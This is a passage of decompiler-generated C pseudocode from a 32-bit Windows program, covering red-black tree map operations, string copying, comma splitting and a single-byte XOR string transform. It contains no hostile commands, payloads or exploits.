    if ( v4 != (int **)v5 )
    {
      v6 = sub_410070(v2, v4);
      sub_44775B(v6);
    }
  }
  sub_40FC60(this + 4, (int)(this + 4), *(void ***)(this[4] + 4));
  sub_44775B((void *)this[4]);
  v7 = (volatile signed __int32 *)this[2];
  if ( v7 && !_InterlockedExchangeAdd(v7 + 1, 0xFFFFFFFF) )
  {
    (**(void (__thiscall ***)(volatile signed __int32 *))v7)(v7);
    if ( !_InterlockedDecrement(v7 + 2) )
      (*(void (__thiscall **)(volatile signed __int32 *))(*v7 + 4))(v7);
  }
}
// 49E668: using guessed type void *ANIColleague::`vftable';

//----- (0040F8F0) --------------------------------------------------------
void __thiscall sub_40F8F0(_DWORD *this, int a2)
{
  int *v2; // esi
  int v3; // ecx
  int v4; // eax
  int v5; // [esp+4h] [ebp-Ch] BYREF
  int v6; // [esp+Ch] [ebp-4h]

  if ( this[1] )
  {
    *(_DWORD *)(a2 + 4) = this[3];
    v2 = (int *)this[1];
    sub_40FC10(v2, &v5, (int *)(a2 + 8));
    v3 = v6;
    if ( *(_BYTE *)(v6 + 13) || *(_DWORD *)(a2 + 8) < *(_DWORD *)(v6 + 16) )
    {
      v3 = *v2;
      v4 = *v2;
    }
    else
    {
      v4 = *v2;
    }
    if ( v3 != v4 )
      (*(void (__thiscall **)(_DWORD, int))(**(_DWORD **)(v3 + 20) + 8))(*(_DWORD *)(v3 + 20), a2);
  }
}

//----- (0040F950) --------------------------------------------------------
int __thiscall sub_40F950(int *this, int a2)
{
  _DWORD *v2; // edi
  int v3; // esi
  int result; // eax
  int v5; // ecx
  int (__thiscall ***v6)(_DWORD, char *); // edx
  int v7; // [esp+10h] [ebp-48h] BYREF
  int v8; // [esp+18h] [ebp-40h]
  char v9[36]; // [esp+1Ch] [ebp-3Ch] BYREF
  char *v10; // [esp+40h] [ebp-18h]
  int v11; // [esp+44h] [ebp-14h] BYREF
  int v12; // [esp+54h] [ebp-4h]

  v2 = this + 4;
  v3 = *(_DWORD *)(a2 + 12);
  v11 = v3;
  sub_40FC10(this + 4, &v7, &v11);
  result = v8;
  if ( *(_BYTE *)(v8 + 13) || v3 < *(_DWORD *)(v8 + 16) || v8 == *v2 )
  {
    v5 = 0;
  }
  else
  {
    v5 = 0;
    v10 = 0;
    v12 = 0;
    v6 = *(int (__thiscall ****)(_DWORD, char *))(v8 + 60);
    if ( !v6 )
      goto LABEL_8;
    result = (**v6)(v6, v9);
    v5 = result;
  }
  v10 = (char *)v5;
LABEL_8:
  v12 = 1;
  if ( v5 )
  {
    result = (*(int (__thiscall **)(int, int))(*(_DWORD *)v5 + 8))(v5, a2);
    if ( v10 )
      return (*(int (__stdcall **)(bool))(*(_DWORD *)v10 + 16))(v10 != v9);
  }
  return result;
}

//----- (0040FA20) --------------------------------------------------------
int __thiscall sub_40FA20(int *this, int a2, int a3)
{
  int *v3; // esi
  int (__thiscall ***v4)(_DWORD, char *); // ecx
  int result; // eax
  int v6; // [esp+8h] [ebp-44h] BYREF
  char v7[36]; // [esp+10h] [ebp-3Ch] BYREF
  char *v8; // [esp+34h] [ebp-18h]
  char v9[4]; // [esp+38h] [ebp-14h] BYREF
  char *v10; // [esp+3Ch] [ebp-10h]
  int v11; // [esp+48h] [ebp-4h]

  v3 = this + 4;
  v6 = a2;
  v10 = v7;
  v8 = 0;
  v11 = 0;
  v4 = *(int (__thiscall ****)(_DWORD, char *))(a3 + 36);
  if ( v4 )
    v8 = (char *)(**v4)(v4, v7);
  v11 = 1;
  result = sub_40FAF0(v3, (int)v9, &v6);
  if ( v8 )
    return (*(int (__stdcall **)(bool))(*(_DWORD *)v8 + 16))(v8 != v7);
  return result;
}
// 40FA20: using guessed type char var_14[4];

//----- (0040FAF0) --------------------------------------------------------
int __thiscall sub_40FAF0(int *this, int a2, int *a3)
{
  _DWORD *v4; // eax
  int v5; // ecx
  char v6; // al
  _DWORD *v7; // esi
  int *v8; // edi
  int v9; // ecx
  int v10; // ecx
  int v11; // eax
  int *v12; // ecx
  int result; // eax
  __int64 v14; // [esp+10h] [ebp-2Ch]
  _DWORD v15[3]; // [esp+1Ch] [ebp-20h] BYREF
  int *v16; // [esp+28h] [ebp-14h]
  int v17; // [esp+2Ch] [ebp-10h]
  int v18; // [esp+38h] [ebp-4h]

  v16 = this;
  v4 = sub_40FC10(this, v15, a3);
  v5 = v4[2];
  v14 = *(_QWORD *)v4;
  if ( *(_BYTE *)(v5 + 13) || *a3 < *(_DWORD *)(v5 + 16) )
  {
    if ( this[1] == 0x3FFFFFF )
      sub_40F6F0();
    v17 = *this;
    v15[1] = this;
    v18 = 0;
    v15[2] = 0;
    v7 = operator new(0x40u);
    v8 = a3 + 2;
    v7[4] = *a3;
    v7[15] = 0;
    v9 = a3[11];
    if ( !v9 )
      goto LABEL_11;
    if ( (int *)v9 == v8 )
    {
      v7[15] = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)v9 + 4))(v9, v7 + 6);
      v10 = a3[11];
      if ( !v10 )
      {
LABEL_11:
        v11 = v17;
        v12 = v16;
        *v7 = v17;
        v7[1] = v11;
        v7[2] = v11;
        *((_WORD *)v7 + 6) = 0;
        v5 = sub_40FCD0(v12, (_DWORD *)v14, SHIDWORD(v14), (int)v7);
        v6 = 1;
        goto LABEL_12;
      }
      (*(void (__stdcall **)(bool))(*(_DWORD *)v10 + 16))(v10 != (_DWORD)v8);
    }
    else
    {
      v7[15] = v9;
    }
    a3[11] = 0;
    goto LABEL_11;
  }
  v6 = 0;
LABEL_12:
  *(_BYTE *)(a2 + 4) = v6;
  result = a2;
  *(_DWORD *)a2 = v5;
  return result;
}
// 40F6F0: using guessed type void __noreturn sub_40F6F0(void);

//----- (0040FC10) --------------------------------------------------------
_DWORD *__thiscall sub_40FC10(int *this, _DWORD *a2, int *a3)
{
  int v3; // ecx
  int *v4; // eax
  int v5; // esi
  int v6; // ecx

  v3 = *this;
  v4 = *(int **)(v3 + 4);
  *a2 = v4;
  a2[1] = 0;
  a2[2] = v3;
  if ( !*((_BYTE *)v4 + 13) )
  {
    v5 = *a3;
    do
    {
      *a2 = v4;
      if ( v4[4] >= v5 )
      {
        a2[2] = v4;
        v6 = 1;
        v4 = (int *)*v4;
      }
      else
      {
        v4 = (int *)v4[2];
        v6 = 0;
      }
      a2[1] = v6;
    }
    while ( !*((_BYTE *)v4 + 13) );
  }
  return a2;
}

//----- (0040FC60) --------------------------------------------------------
void *__thiscall sub_40FC60(void *this, int a2, void **Block)
{
  void **v3; // esi
  void *result; // eax
  int v5; // ecx
  void **v6; // edi
  void **v7; // ecx
  int i; // [esp+8h] [ebp-4h]

  v3 = Block;
  result = this;
  v5 = a2;
  for ( i = (int)result; !*((_BYTE *)v3 + 13); v5 = a2 )
  {
    sub_40FC60(v5, v3[2]);
    v6 = v3;
    v3 = (void **)*v3;
    v7 = (void **)v6[15];
    if ( v7 )
    {
      (*((void (__stdcall **)(bool))*v7 + 4))(v7 != v6 + 6);
      v6[15] = 0;
    }
    sub_44775B(v6);
    result = (void *)i;
  }
  return result;
}

//----- (0040FCD0) --------------------------------------------------------
int __thiscall sub_40FCD0(_DWORD *this, _DWORD *a2, int a3, int a4)
{
  _DWORD *v4; // ecx
  int result; // eax
  _DWORD *v6; // edx
  _DWORD *v7; // ecx
  _DWORD *v8; // edi
  int *v9; // esi
  _DWORD *v10; // ebx
  _DWORD *v11; // eax
  _DWORD *v12; // esi
  _DWORD *v13; // eax
  _DWORD *v14; // ecx
  _DWORD *v15; // esi
  int v16; // eax
  _DWORD *v17; // eax
  _DWORD *v18; // eax
  int v19; // eax
  _DWORD *v20; // eax
  _DWORD *v21; // eax
  _DWORD *v22; // [esp+0h] [ebp-8h]

  v4 = (_DWORD *)*this;
  ++this[1];
  result = a4;
  v22 = v4;
  *(_DWORD *)(a4 + 4) = a2;
  if ( a2 == v4 )
  {
    *v4 = a4;
    v4[1] = a4;
    v4[2] = a4;
    *(_BYTE *)(a4 + 12) = 1;
    return result;
  }
  if ( a3 )
  {
    *a2 = a4;
    if ( a2 == (_DWORD *)*v4 )
      *v4 = a4;
  }
  else
  {
    a2[2] = a4;
    if ( a2 == (_DWORD *)v4[2] )
      v4[2] = a4;
  }
  v6 = (_DWORD *)a4;
  if ( !*(_BYTE *)(*(_DWORD *)(a4 + 4) + 12) )
  {
    while ( 1 )
    {
      v7 = (_DWORD *)v6[1];
      v8 = v6 + 1;
      v9 = (int *)v7[1];
      v10 = v7 + 1;
      v11 = (_DWORD *)*v9;
      if ( v7 == (_DWORD *)*v9 )
      {
        v11 = (_DWORD *)v9[2];
        if ( *((_BYTE *)v11 + 12) )
        {
          v12 = (_DWORD *)v7[2];
          if ( v6 == v12 )
          {
            v6 = (_DWORD *)v6[1];
            v7[2] = *v12;
            if ( !*(_BYTE *)(*v12 + 13) )
              *(_DWORD *)(*v12 + 4) = v7;
            v12[1] = *v10;
            if ( v7 == *(_DWORD **)(*this + 4) )
            {
              *(_DWORD *)(*this + 4) = v12;
              v8 = v7 + 1;
              *v12 = v7;
              *v10 = v12;
            }
            else
            {
              v13 = (_DWORD *)*v10;
              if ( v7 == *(_DWORD **)*v10 )
                *v13 = v12;
              else
                v13[2] = v12;
              v8 = v7 + 1;
              *v12 = v7;
              *v10 = v12;
            }
          }
          else
          {
            v12 = (_DWORD *)v6[1];
          }
          *((_BYTE *)v12 + 12) = 1;
          *(_BYTE *)(*(_DWORD *)(*v8 + 4) + 12) = 0;
          v14 = *(_DWORD **)(*v8 + 4);
          v15 = (_DWORD *)*v14;
          *v14 = *(_DWORD *)(*v14 + 8);
          v16 = v15[2];
          if ( !*(_BYTE *)(v16 + 13) )
            *(_DWORD *)(v16 + 4) = v14;
          v15[1] = v14[1];
          if ( v14 == *(_DWORD **)(*this + 4) )
          {
            *(_DWORD *)(*this + 4) = v15;
            v15[2] = v14;
          }
          else
          {
            v17 = (_DWORD *)v14[1];
            if ( v14 == (_DWORD *)v17[2] )
              v17[2] = v15;
            else
              *v17 = v15;
            v15[2] = v14;
          }
LABEL_48:
          v14[1] = v15;
          goto LABEL_49;
        }
      }
      else if ( *((_BYTE *)v11 + 12) )
      {
        v18 = (_DWORD *)*v7;
        if ( v6 == (_DWORD *)*v7 )
        {
          v6 = (_DWORD *)v6[1];
          v7 = (_DWORD *)*v7;
          *v6 = v18[2];
          v19 = v18[2];
          if ( !*(_BYTE *)(v19 + 13) )
            *(_DWORD *)(v19 + 4) = v6;
          v7[1] = *v10;
          if ( v6 == *(_DWORD **)(*this + 4) )
          {
            *(_DWORD *)(*this + 4) = v7;
          }
          else
          {
            v20 = (_DWORD *)*v10;
            if ( v6 == *(_DWORD **)(*v10 + 8) )
              v20[2] = v7;
            else
              *v20 = v7;
          }
          v7[2] = v6;
          v8 = v10;
          *v10 = v7;
        }
        *((_BYTE *)v7 + 12) = 1;
        *(_BYTE *)(*(_DWORD *)(*v8 + 4) + 12) = 0;
        v14 = *(_DWORD **)(*v8 + 4);
        v15 = (_DWORD *)v14[2];
        v14[2] = *v15;
        if ( !*(_BYTE *)(*v15 + 13) )
          *(_DWORD *)(*v15 + 4) = v14;
        v15[1] = v14[1];
        if ( v14 == *(_DWORD **)(*this + 4) )
        {
          *(_DWORD *)(*this + 4) = v15;
        }
        else
        {
          v21 = (_DWORD *)v14[1];
          if ( v14 == (_DWORD *)*v21 )
            *v21 = v15;
          else
            v21[2] = v15;
        }
        *v15 = v14;
        goto LABEL_48;
      }
      *((_BYTE *)v7 + 12) = 1;
      *((_BYTE *)v11 + 12) = 1;
      *(_BYTE *)(*(_DWORD *)(*v8 + 4) + 12) = 0;
      v6 = *(_DWORD **)(*v8 + 4);
LABEL_49:
      if ( *(_BYTE *)(v6[1] + 12) )
      {
        v4 = v22;
        break;
      }
    }
  }
  *(_BYTE *)(v4[1] + 12) = 1;
  return a4;
}

//----- (0040FF00) --------------------------------------------------------
void __thiscall sub_40FF00(int *this, int a2)
{
  int v3; // esi
  _DWORD *v4; // eax
  __int64 v5; // xmm0_8
  int v6; // eax
  int v7; // esi
  int *v8; // eax
  _DWORD *v9; // [esp-Ch] [ebp-4Ch]
  int v10; // [esp-8h] [ebp-48h]
  int v11[3]; // [esp+10h] [ebp-30h] BYREF
  __int64 v12; // [esp+1Ch] [ebp-24h]
  int v13; // [esp+28h] [ebp-18h]
  int *v14; // [esp+2Ch] [ebp-14h] BYREF
  int v15; // [esp+30h] [ebp-10h]
  int v16; // [esp+3Ch] [ebp-4h]

  if ( a2 )
  {
    v3 = *(_DWORD *)(a2 + 12);
    v13 = v3;
    v14 = (int *)v3;
    v15 = a2;
    v4 = sub_40FC10(this, v11, (int *)&v14);
    v5 = *(_QWORD *)v4;
    v6 = v4[2];
    v12 = v5;
    if ( *(_BYTE *)(v6 + 13) || v3 < *(_DWORD *)(v6 + 16) )
    {
      if ( this[1] == 178956970 )
        sub_40F6F0();
      v7 = *this;
      v14 = this;
      v16 = 0;
      v15 = 0;
      v8 = (int *)operator new(0x18u);
      v8[4] = v13;
      v10 = HIDWORD(v12);
      v8[5] = a2;
      v9 = (_DWORD *)v12;
      *v8 = v7;
      v8[1] = v7;
      v8[2] = v7;
      *((_WORD *)v8 + 6) = 0;
      sub_40FCD0(this, v9, v10, (int)v8);
    }
  }
}
// 40F6F0: using guessed type void __noreturn sub_40F6F0(void);
// 40FF00: using guessed type int var_30[3];

//----- (00410010) --------------------------------------------------------
int *__thiscall sub_410010(int *this)
{
  int v2; // edx
  int **v3; // edi
  int i; // eax
  int *j; // ecx

  v2 = *this;
  v3 = *(int ***)(*this + 8);
  if ( *((_BYTE *)v3 + 13) )
  {
    for ( i = *(_DWORD *)(v2 + 4); !*(_BYTE *)(i + 13); i = *(_DWORD *)(i + 4) )
    {
      if ( v2 != *(_DWORD *)(i + 8) )
        break;
      *this = i;
      v2 = i;
    }
    *this = i;
    return this;
  }
  else
  {
    for ( j = *v3; !*((_BYTE *)j + 13); j = (int *)*j )
      v3 = (int **)j;
    *this = (int)v3;
    return this;
  }
}

//----- (00410070) --------------------------------------------------------
int **__thiscall sub_410070(_DWORD *this, int **a2)
{
  int **v2; // ebx
  _DWORD *v3; // edi
  int *v4; // esi
  int *v5; // edx
  int *v6; // ecx
  _DWORD *v7; // ebx
  int **v8; // eax
  int *v9; // edi
  int *v10; // edx
  int v11; // ebx
  char v12; // bl
  int *v13; // eax
  int *i; // edx
  int **v15; // eax
  int *v16; // eax
  int *v17; // ebx
  int *v18; // edx
  int *v19; // edx
  int **v20; // eax
  int v21; // edi
  int v22; // eax
  int *v23; // edx
  int v24; // eax
  _DWORD *v25; // eax
  int v26; // edi
  int v27; // ecx
  int **result; // eax
  _DWORD *v29; // eax
  int *v30; // edx
  int **v31; // eax
  int *v32; // edi
  int **v33; // eax
  int *v34; // edx
  int v35; // eax
  _DWORD *v36; // eax
  int **v37; // [esp+Ch] [ebp-8h]

  v2 = a2;
  v3 = this;
  v37 = a2;
  sub_410010((int *)&a2);
  v4 = v2[2];
  if ( !*((_BYTE *)*v2 + 13) )
  {
    if ( *((_BYTE *)v4 + 13) )
    {
      v4 = *v2;
    }
    else
    {
      v5 = (int *)a2;
      v4 = a2[2];
      if ( a2 != v2 )
      {
        (*v2)[1] = (int)a2;
        *v5 = (int)*v2;
        if ( v5 == v2[2] )
        {
          v6 = v5;
        }
        else
        {
          v6 = (int *)v5[1];
          if ( !*((_BYTE *)v4 + 13) )
            v4[1] = (int)v6;
          *v6 = (int)v4;
          v5[2] = (int)v2[2];
          v2[2][1] = (int)v5;
        }
        if ( *(int ***)(*v3 + 4) == v2 )
        {
          *(_DWORD *)(*v3 + 4) = v5;
        }
        else
        {
          v15 = (int **)v2[1];
          if ( *v15 == (int *)v2 )
            *v15 = v5;
          else
            v15[2] = v5;
        }
        v16 = v2[1];
        v12 = *((_BYTE *)v5 + 12);
        v5[1] = (int)v16;
        *((_BYTE *)v5 + 12) = *((_BYTE *)v37 + 12);
        *((_BYTE *)v37 + 12) = v12;
        goto LABEL_37;
      }
    }
  }
  v6 = v2[1];
  if ( !*((_BYTE *)v4 + 13) )
    v4[1] = (int)v6;
  if ( *(int ***)(*v3 + 4) == v2 )
  {
    *(_DWORD *)(*v3 + 4) = v4;
  }
  else if ( (int **)*v6 == v2 )
  {
    *v6 = (int)v4;
  }
  else
  {
    v6[2] = (int)v4;
  }
  v7 = (_DWORD *)*v3;
  v8 = v37;
  if ( *(int ***)*v3 == v37 )
  {
    if ( *((_BYTE *)v4 + 13) )
    {
      v9 = v6;
    }
    else
    {
      v10 = (int *)*v4;
      v9 = v4;
      if ( !*(_BYTE *)(*v4 + 13) )
      {
        do
        {
          v9 = v10;
          v10 = (int *)*v10;
        }
        while ( !*((_BYTE *)v10 + 13) );
        v8 = v37;
      }
    }
    *v7 = v9;
    v3 = this;
  }
  v11 = *v3;
  if ( *(int ***)(*v3 + 8) == v8 )
  {
    if ( *((_BYTE *)v4 + 13) )
    {
      *(_DWORD *)(v11 + 8) = v6;
      v12 = *((_BYTE *)v8 + 12);
      goto LABEL_37;
    }
    v13 = (int *)v4[2];
    for ( i = v4; !*((_BYTE *)v13 + 13); v13 = (int *)v13[2] )
      i = v13;
    v8 = v37;
    *(_DWORD *)(v11 + 8) = i;
  }
  v12 = *((_BYTE *)v8 + 12);
LABEL_37:
  if ( v12 == 1 )
  {
    if ( v4 != *(int **)(*v3 + 4) )
    {
      do
      {
        v17 = v6;
        if ( *((_BYTE *)v4 + 12) != 1 )
          break;
        v18 = (int *)*v6;
        if ( v4 == (int *)*v6 )
        {
          v18 = (int *)v6[2];
          if ( !*((_BYTE *)v18 + 12) )
          {
            *((_BYTE *)v18 + 12) = 1;
            v19 = (int *)v6[2];
            *((_BYTE *)v6 + 12) = 0;
            v6[2] = *v19;
            if ( !*(_BYTE *)(*v19 + 13) )
              *(_DWORD *)(*v19 + 4) = v6;
            v19[1] = v6[1];
            if ( v6 == *(int **)(*v3 + 4) )
            {
              *(_DWORD *)(*v3 + 4) = v19;
            }
            else
            {
              v20 = (int **)v6[1];
              if ( v6 == *v20 )
                *v20 = v19;
              else
                v20[2] = v19;
            }
            *v19 = (int)v6;
            v6[1] = (int)v19;
            v18 = (int *)v6[2];
          }
          if ( *((_BYTE *)v18 + 13) )
            goto LABEL_71;
          if ( *(_BYTE *)(*v18 + 12) != 1 || *(_BYTE *)(v18[2] + 12) != 1 )
          {
            if ( *(_BYTE *)(v18[2] + 12) == 1 )
            {
              *(_BYTE *)(*v18 + 12) = 1;
              v21 = *v18;
              *((_BYTE *)v18 + 12) = 0;
              *v18 = *(_DWORD *)(v21 + 8);
              v22 = *(_DWORD *)(v21 + 8);
              if ( !*(_BYTE *)(v22 + 13) )
                *(_DWORD *)(v22 + 4) = v18;
              *(_DWORD *)(v21 + 4) = v18[1];
              if ( v18 == *(int **)(*this + 4) )
              {
                *(_DWORD *)(*this + 4) = v21;
              }
              else
              {
                v29 = (_DWORD *)v18[1];
                if ( v18 == (int *)v29[2] )
                  v29[2] = v21;
                else
                  *v29 = v21;
              }
              *(_DWORD *)(v21 + 8) = v18;
              v18[1] = v21;
              v18 = (int *)v6[2];
            }
            *((_BYTE *)v18 + 12) = *((_BYTE *)v6 + 12);
            *((_BYTE *)v6 + 12) = 1;
            *(_BYTE *)(v18[2] + 12) = 1;
            v30 = (int *)v6[2];
            v6[2] = *v30;
            if ( !*(_BYTE *)(*v30 + 13) )
              *(_DWORD *)(*v30 + 4) = v6;
            v3 = this;
            v30[1] = v6[1];
            if ( v6 == *(int **)(*this + 4) )
            {
              *(_DWORD *)(*this + 4) = v30;
              *v30 = (int)v6;
              v6[1] = (int)v30;
            }
            else
            {
              v31 = (int **)v6[1];
              if ( v6 == *v31 )
                *v31 = v30;
              else
                v31[2] = v30;
              *v30 = (int)v6;
              v6[1] = (int)v30;
            }
            break;
          }
        }
        else
        {
          if ( !*((_BYTE *)v18 + 12) )
          {
            *((_BYTE *)v18 + 12) = 1;
            v23 = (int *)*v6;
            *((_BYTE *)v6 + 12) = 0;
            *v6 = v23[2];
            v24 = v23[2];
            if ( !*(_BYTE *)(v24 + 13) )
              *(_DWORD *)(v24 + 4) = v6;
            v23[1] = v6[1];
            if ( v6 == *(int **)(*v3 + 4) )
            {
              *(_DWORD *)(*v3 + 4) = v23;
            }
            else
            {
              v25 = (_DWORD *)v6[1];
              if ( v6 == (int *)v25[2] )
                v25[2] = v23;
              else
                *v25 = v23;
            }
            v23[2] = (int)v6;
            v6[1] = (int)v23;
            v18 = (int *)*v6;
          }
          if ( *((_BYTE *)v18 + 13) )
            goto LABEL_71;
          v26 = v18[2];
          if ( *(_BYTE *)(v26 + 12) != 1 || *(_BYTE *)(*v18 + 12) != 1 )
          {
            if ( *(_BYTE *)(*v18 + 12) == 1 )
            {
              *(_BYTE *)(v26 + 12) = 1;
              v32 = (int *)v18[2];
              *((_BYTE *)v18 + 12) = 0;
              v18[2] = *v32;
              if ( !*(_BYTE *)(*v32 + 13) )
                *(_DWORD *)(*v32 + 4) = v18;
              v32[1] = v18[1];
              if ( v18 == *(int **)(*this + 4) )
              {
                *(_DWORD *)(*this + 4) = v32;
              }
              else
              {
                v33 = (int **)v18[1];
                if ( v18 == *v33 )
                  *v33 = v32;
                else
                  v33[2] = v32;
              }
              *v32 = (int)v18;
              v18[1] = (int)v32;
              v18 = (int *)*v6;
            }
            *((_BYTE *)v18 + 12) = *((_BYTE *)v6 + 12);
            *((_BYTE *)v6 + 12) = 1;
            *(_BYTE *)(*v18 + 12) = 1;
            v34 = (int *)*v6;
            *v6 = *(_DWORD *)(*v6 + 8);
            v35 = v34[2];
            if ( !*(_BYTE *)(v35 + 13) )
              *(_DWORD *)(v35 + 4) = v6;
            v3 = this;
            v34[1] = v6[1];
            if ( v6 == *(int **)(*this + 4) )
            {
              *(_DWORD *)(*this + 4) = v34;
              v34[2] = (int)v6;
              v6[1] = (int)v34;
            }
            else
            {
              v36 = (_DWORD *)v6[1];
              if ( v6 == (int *)v36[2] )
                v36[2] = v34;
              else
                *v36 = v34;
              v34[2] = (int)v6;
              v6[1] = (int)v34;
            }
            break;
          }
        }
        v3 = this;
        *((_BYTE *)v18 + 12) = 0;
LABEL_71:
        v4 = v6;
        v6 = (int *)v6[1];
      }
      while ( v17 != *(int **)(*v3 + 4) );
    }
    *((_BYTE *)v4 + 12) = 1;
  }
  v27 = v3[1];
  result = v37;
  if ( v27 )
    v3[1] = v27 - 1;
  return result;
}

//----- (00410450) --------------------------------------------------------
void __stdcall sub_410450(int a1, void **Block)
{
  void **v2; // esi
  void **v3; // eax

  v2 = Block;
  while ( !*((_BYTE *)v2 + 13) )
  {
    sub_410450(a1, v2[2]);
    v3 = v2;
    v2 = (void **)*v2;
    sub_44775B(v3);
  }
}

//----- (004104B0) --------------------------------------------------------
int __fastcall sub_4104B0(int a1, int a2, int a3)
{
  int v3; // edi
  char *v4; // ecx
  unsigned int v5; // edx
  int v6; // edi
  int v7; // esi
  __int128 *p_Src; // eax
  char *v9; // eax
  char v10; // cl
  __int128 v11; // xmm0
  __int128 Src; // [esp+14h] [ebp-2Ch] BYREF
  void *v16[2]; // [esp+24h] [ebp-1Ch]
  char v17[4]; // [esp+2Ch] [ebp-14h]
  int v18; // [esp+3Ch] [ebp-4h]

  *(_DWORD *)v17 = a2;
  v3 = a1;
  if ( a2 && a3 > 0 )
  {
    v4 = 0;
    v5 = 15;
    v16[0] = 0;
    v16[1] = (void *)15;
    LOBYTE(Src) = 0;
    v6 = *(_DWORD *)v17;
    v7 = 0;
    v18 = 0;
    while ( 1 )
    {
      v17[0] = *(_BYTE *)(v7 + v6);
      if ( (unsigned int)v4 >= v5 )
      {
        sub_40D800((void **)&Src, 1u, a1, v17[0]);
      }
      else
      {
        v16[0] = v4 + 1;
        p_Src = &Src;
        if ( v5 >= 0x10 )
          p_Src = (__int128 *)Src;
        v9 = (char *)p_Src + (_DWORD)v4;
        v10 = v17[0];
        v9[1] = 0;
        *v9 = v10;
      }
      if ( ++v7 >= a3 )
        break;
      v5 = (unsigned int)v16[1];
      v4 = (char *)v16[0];
    }
    v3 = a1;
    v11 = Src;
    *(_DWORD *)(a1 + 16) = 0;
    *(_DWORD *)(a1 + 20) = 0;
    *(_OWORD *)a1 = v11;
    *(_QWORD *)(a1 + 16) = *(_QWORD *)v16;
  }
  else
  {
    *(_DWORD *)(a1 + 16) = 0;
    *(_DWORD *)(a1 + 20) = 15;
    *(_BYTE *)a1 = 0;
    sub_40A390((void **)a1, (void *)::Src, 0);
  }
  return v3;
}

//----- (004105C0) --------------------------------------------------------
_DWORD *__fastcall sub_4105C0(_DWORD *a1, int *a2)
{
  int v2; // eax
  int v3; // edi
  _BYTE *v4; // esi
  _BYTE *v5; // edi
  __int128 v6; // xmm0
  __int128 v7; // xmm0
  void *v8; // ecx
  int v9; // ecx
  _DWORD *result; // eax
  void *Block[4]; // [esp+14h] [ebp-34h] BYREF
  __int64 v13; // [esp+24h] [ebp-24h]
  __int64 v14; // [esp+2Ch] [ebp-1Ch] BYREF
  int v15; // [esp+34h] [ebp-14h]
  int v16; // [esp+44h] [ebp-4h]

  v2 = 0;
  v14 = 0i64;
  v15 = 0;
  v16 = 0;
  v3 = a2[4];
  if ( !v3 )
    goto LABEL_20;
  v13 = 0x700000000i64;
  LOWORD(Block[0]) = 0;
  LOBYTE(v16) = 1;
  v4 = a2;
  if ( (unsigned int)a2[5] >= 0x10 )
  {
    v4 = (_BYTE *)*a2;
    a2 = (int *)*a2;
  }
  v5 = (char *)a2 + v3;
  if ( v4 == v5 )
    goto LABEL_20;
  do
  {
    if ( *v4 == 44 )
    {
      if ( v2 != v15 )
      {
        v6 = *(_OWORD *)Block;
        *(_DWORD *)(v2 + 16) = 0;
        *(_OWORD *)v2 = v6;
        *(_QWORD *)(v2 + 16) = v13;
        LOWORD(Block[0]) = 0;
        v2 = HIDWORD(v14) + 24;
        v13 = 0x700000000i64;
        HIDWORD(v14) += 24;
        goto LABEL_11;
      }
      sub_404640((int *)&v14, v2, (int)Block);
    }
    else
    {
      sub_40E8C0((int *)Block, (char)*v4);
    }
    v2 = HIDWORD(v14);
LABEL_11:
    ++v4;
  }
  while ( v4 != v5 );
  if ( (_DWORD)v13 )
  {
    if ( v2 != v15 )
    {
      v7 = *(_OWORD *)Block;
      *(_DWORD *)(v2 + 16) = 0;
      *(_OWORD *)v2 = v7;
      *(_QWORD *)(v2 + 16) = v13;
      v2 = HIDWORD(v14) + 24;
      goto LABEL_20;
    }
    sub_404640((int *)&v14, v2, (int)Block);
    v2 = HIDWORD(v14);
  }
  if ( HIDWORD(v13) >= 8 )
  {
    v8 = Block[0];
    if ( (unsigned int)(2 * HIDWORD(v13) + 2) >= 0x1000 )
    {
      v8 = (void *)*((_DWORD *)Block[0] - 1);
      if ( (unsigned int)(Block[0] - v8 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v8);
    v2 = HIDWORD(v14);
  }
LABEL_20:
  *a1 = v14;
  v9 = v15;
  a1[1] = v2;
  result = a1;
  a1[2] = v9;
  return result;
}

//----- (00410770) --------------------------------------------------------
int __fastcall sub_410770(int a1, _DWORD *a2, int a3, char a4)
{
  int result; // eax
  unsigned int v5; // edi
  int v6; // esi
  _DWORD *v7; // eax
  char v8; // cl
  __int128 *p_Src; // eax
  __int128 v10; // xmm0
  _DWORD *v11; // [esp+Ch] [ebp-34h]
  __int128 Src; // [esp+14h] [ebp-2Ch] BYREF
  __int64 v14; // [esp+24h] [ebp-1Ch]
  char v15[4]; // [esp+2Ch] [ebp-14h]
  int v16; // [esp+3Ch] [ebp-4h]

  v11 = a2;
  result = a1;
  v5 = 0;
  *(_DWORD *)v15 = a1;
  v14 = 0xF00000000i64;
  LOBYTE(Src) = 0;
  v16 = 0;
  if ( a3 > 0 )
  {
    v6 = 0;
    while ( 1 )
    {
      v7 = a2;
      if ( a2[5] >= 0x10u )
        v7 = (_DWORD *)*a2;
      v8 = a4 ^ *((_BYTE *)v7 + v6);
      v15[0] = v8;
      if ( v5 >= HIDWORD(v14) )
      {
        sub_40D800((void **)&Src, 1u, a1, v15[0]);
        a2 = v11;
      }
      else
      {
        LODWORD(v14) = v5 + 1;
        p_Src = &Src;
        if ( HIDWORD(v14) >= 0x10 )
          p_Src = (__int128 *)Src;
        *((_BYTE *)p_Src + v5) = v8;
        *((_BYTE *)p_Src + v5 + 1) = 0;
      }
      if ( ++v6 >= a3 )
        break;
      v5 = v14;
    }
    result = a1;
  }
  v10 = Src;
  *(_DWORD *)(result + 16) = 0;
  *(_DWORD *)(result + 20) = 0;
  *(_OWORD *)result = v10;
  *(_QWORD *)(result + 16) = v14;
  return result;
}

//----- (00410850) --------------------------------------------------------
int *__thiscall sub_410850(int *this, int a2, volatile signed __int32 *a3)
{
  int v4; // esi
  int v5; // edi
  _DWORD *v6; // eax
  const CHAR *v7; // eax
  void *v8; // ecx
  void *v9; // ecx
  int v10; // esi
  int v11; // edi
  _DWORD *v12; // eax
  void *v13; // ecx
  int v14; // esi
  int v15; // edi
  _DWORD *v16; // eax
  int *v17; // eax
  void *v18; // ecx
  void *v19; // ecx
  int v20; // esi
  int v21; // edi
  _DWORD *v22; // eax
  int *v23; // eax
  void *v24; // ecx
  void *v25; // ecx
  int v26; // esi
  int v27; // edi
  _DWORD *v28; // eax
  int *v29; // eax
  void *v30; // ecx
  void *v31; // ecx
  int v32; // esi
  int v33; // edi
  _DWORD *v34; // eax
  int *v35; // eax
  void *v36; // ecx
  void *v37; // ecx
  int v38; // esi
  int v39; // edi
  _DWORD *v40; // eax
  void *v41; // ecx
  void *v43[5]; // [esp+10h] [ebp-134h] BYREF
